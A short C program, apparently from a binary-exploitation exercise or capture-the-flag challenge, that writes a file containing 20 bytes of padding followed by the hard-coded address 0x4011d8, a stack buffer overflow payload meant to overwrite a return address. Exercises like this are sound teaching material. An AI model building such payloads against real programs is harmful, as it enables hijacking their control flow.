#include <stdio.h>
#include <string.h>

int main(){
    FILE *f = fopen("input.bin", "wb");
    if (!f){
        return 1;
    }

    char trash[20];
    memset(trash, 'q', sizeof(trash));

    unsigned long long return_address = 0x4011d8;

    fwrite(trash, 1, sizeof(trash), f);
    fwrite(&return_address, 1, sizeof(return_address), f);

    fclose(f);
    return 0;
}